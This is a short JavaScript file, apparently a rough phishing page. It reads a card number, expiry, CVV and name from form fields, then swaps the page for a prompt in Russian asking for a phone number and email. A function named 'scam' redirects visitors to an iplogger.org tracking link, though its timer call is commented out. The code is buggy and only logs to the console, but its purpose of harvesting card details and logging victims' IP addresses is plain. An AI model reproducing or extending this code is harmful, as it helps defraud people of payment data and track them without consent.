let pButton = document.querySelector(".result")
pButton.addEventListener("click", (e) =>{
    console.log(e)
    let card = document.querySelector(".card").value 
    console.log(card)
    let mm = document.querySelector(".mm").value 
    console.log(mm)
    let cvv = document.querySelector(".cvv").value 
    console.log(cvv)
    let name = document.querySelector(".name").value
    console.log(name)
    document.querySelector("body").innerHTML = ""
    let h1 = document.createElement("h1")
    h1.textContent = "Заполни больше информации для получени более точной информации"
    let input = document.createElement('input')
    input.className = "nomer"
    input.setAttribute("type", "number")
    input.setAttribute("placeholder", "Номер")
    let input1 = document.createElement('input')
    input1.className = "email"
    input1.setAttribute("type", "text")
    input1.setAttribute("placeholder", "Имеил")
    let button = document.createElement('button')
    button.className = "result1"
    button.textContent = "Результат"
    document.querySelector("body").append(button)
    document.querySelector("body").append(input1)
    document.querySelector("body").append(input)
    document.querySelector("body").append(h1)
    let aButton = document.querySelector(".result1")
pButton.addEventListener("click", (e) =>{
    console.log(e)
    let number = document.querySelector(".number").value 
    console.log(number)
})    
    function scam() {
        window.location.href = 'https://iplogger.org/2Lcxj7'
       }
       //setTimeout(scam, 5000)
})
